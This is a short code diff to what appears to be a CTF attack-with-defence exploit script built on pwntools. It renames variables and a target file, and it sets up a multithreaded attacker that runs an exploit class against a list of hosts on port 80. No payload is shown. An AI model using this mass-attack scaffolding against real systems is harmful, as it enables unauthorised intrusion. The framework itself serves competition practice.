@@ -5,8 +5,8 @@ import pwn
 
 class Exp(AwdTask):
 
-    def exp(self, ip,port):
-        sh = pwn.remote(ip, port)
+    def exp(self, host,port):
+        sh = pwn.remote(host, port)
         pwn.context.arch = "i386"
         # 本来是 interactive，现在直接执行命令
         # sh.interactive()
@@ -14,6 +14,6 @@ class Exp(AwdTask):
         result = sh.recv()
         print(result)
 
-hosts = readlines(f"{dirname(__file__)}/../../ip.txt")
+hosts = readlines(f"{dirname(__file__)}/../../hosts.txt")
 attacker = AwdAttack(hosts=hosts,task_class=Exp,port=80,thread_num=5)
 # attacker.attack()
